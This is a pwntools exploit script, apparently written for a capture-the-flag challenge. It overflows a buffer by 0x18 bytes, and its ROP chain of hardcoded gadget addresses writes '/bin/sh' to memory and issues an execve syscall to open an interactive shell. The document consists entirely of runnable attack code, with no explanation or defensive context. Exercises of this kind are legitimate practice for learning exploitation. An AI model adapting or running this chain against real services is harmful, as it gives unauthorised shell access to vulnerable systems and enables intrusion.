from pwn import *

# r = remote("ctf.adl.tw", 11004)
r = remote("127.0.0.1", 8888)
context.arch = "amd64"

pop_rdi = 0x400686
pop_rsi = 0x410183
pop_rdx_r10 = 0x44bb14
pop_rax = 0x44955c
mov_qptr_rdi_rsi = 0x446d1b
syscall = 0x474d05
buf = 0x6b90e0

raw_input('data')

r.recvuntil(":\n")
payload = "a" * 0x18 + flat([pop_rdi, buf, pop_rsi, "/bin/sh\x00", mov_qptr_rdi_rsi, pop_rsi, 0, pop_rdx_r10, 0, 0, pop_rax, 0x3b, syscall])
r.sendline(payload)
r.interactive()
